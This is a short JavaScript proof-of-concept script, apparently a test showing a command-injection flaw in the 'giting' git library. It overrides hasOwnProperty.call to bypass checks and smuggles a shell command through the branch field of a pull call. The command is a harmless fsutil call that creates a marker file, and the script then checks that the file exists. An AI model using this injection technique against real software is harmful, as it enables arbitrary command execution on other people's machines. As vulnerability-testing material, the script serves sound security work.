Object.prototype.hasOwnProperty.call = () => true;
const Test = require('giting');
const fs = require('fs');
const path = './giting';
try {
    if (fs.existsSync(path)) {
        fs.unlinkSync(path);
    }
} catch (err) {
    console.error(err);
}
file_exist = fs.existsSync(path);
console.log('{ ' + file_exist + ', ' + false + ' }');
let injection_command = ' & fsutil file createnew giting 0 & ';
test = new Test({ workDir: './' });
repo = {
    organization: './',
    name: './',
    branch: injection_command
};
test.pull(repo, function () {
    file_exist = fs.existsSync(path);
    console.log('{ ' + file_exist + ', ' + true + ' }');
    fs.unlink(path, function (err) {
    });
});